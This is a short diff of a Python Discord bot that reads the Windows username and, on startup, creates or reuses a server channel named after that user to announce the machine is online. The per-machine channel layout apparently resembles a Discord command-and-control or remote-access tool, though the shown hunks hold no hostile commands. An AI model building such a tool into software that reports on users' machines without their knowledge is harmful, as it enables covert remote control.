@@ -13,9 +13,9 @@ from datetime import datetime
 from discord.ext import commands
 
 # Setting const (a constant cant be changed in runtime)
-TOKEN = "TOKEN" # Discord bot token
+TOKEN = "token" # Discord bot token
 USERNAME = os.getenv("USERNAME")  # Windows username
-GUILD_ID = 12345678  # Replace with your actual server ID
+GUILD_ID = "GUILD_ID"  # Replace with your actual server ID
 
 # Bot setup with proper intents (intents = the rights the discord bot has)
 intents = discord.Intents.default()
@@ -248,10 +248,11 @@ async def on_ready():
     print(f'✅ Bot found guild: {guild.name} ({guild.id})')
 
     # Find or create a text channel based on the username
-    channel = discord.utils.get(guild.channels, name=f"{USERNAME}")
+    channel_name = USERNAME.lower()
+    channel = discord.utils.get(guild.channels, name=channel_name)
 
     if not channel:
-        channel = await guild.create_text_channel(f"{USERNAME}")
+        channel = await guild.create_text_channel(channel_name)
         print(f"✅ Created channel: {channel.name}")
 
     await channel.send(f"{USERNAME} is online ✅")
